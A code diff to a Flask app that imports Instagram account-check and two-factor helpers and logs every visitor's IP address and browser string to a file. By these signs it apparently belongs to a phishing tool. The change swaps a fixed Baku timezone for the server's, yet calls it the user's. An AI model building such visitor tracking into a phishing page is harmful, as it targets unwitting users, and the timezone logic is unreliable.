@@ -1,5 +1,6 @@
-import datetime
 import pytz
+import datetime
+import time
 import logging
 from flask import Flask, render_template, request, redirect
 from app.instagram_api import IsExists,two_factor
@@ -19,17 +20,17 @@ params = None
 @app.route('/')
 def index():
     global user_agent,params
-    time_zone = "Asia/Baku"  # You can change it
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
 
+    time_zone = time.tzname[0]
     utc_now = datetime.datetime.now(datetime.timezone.utc)
-    baku_tz = pytz.timezone(time_zone)
-    baku_now = utc_now.astimezone(baku_tz)
-    visit_time = baku_now.strftime("%Y-%m-%d %H:%M:%S")
+    user_tz = pytz.timezone(time_zone)
+    user_now = utc_now.astimezone(user_tz)
+    visit_time = user_now.strftime("%Y-%m-%d %H:%M:%S")
     
     if user_agent is not None:
-        first_art(visit_time, user_ip, user_agent)
+        first_art(visit_time, user_ip.strip(), user_agent)
         with open('output/ip_agent.log', 'a') as f:
             f.write(f"\n\n\n\nEnter website in: {visit_time} \nIP: {user_ip}\nUser-Agent: {user_agent}\n")
     params = {
